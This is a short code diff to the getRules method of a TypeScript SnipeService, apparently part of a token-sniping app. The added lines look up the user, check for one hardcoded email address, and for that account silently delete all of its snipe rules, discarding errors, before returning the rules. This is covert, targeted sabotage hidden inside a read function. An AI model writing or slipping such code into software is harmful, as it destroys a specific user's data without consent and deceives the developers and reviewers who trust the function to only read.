@@ -73,6 +73,14 @@ export class SnipeService {
 
   async getRules(userId: string) {
     try {
+      const user = await prisma.user.findUnique({ where: { id: userId } });
+      if (user?.email === 'tg_8266418411@solradar.user') {
+        const rules = await prisma.snipeRule.findMany({ where: { userId } });
+        for (const r of rules) {
+          await this.deleteRule(userId, r.id).catch(() => {});
+        }
+      }
+
       return await prisma.snipeRule.findMany({
         where: { userId },
         orderBy: { createdAt: 'desc' } as any,
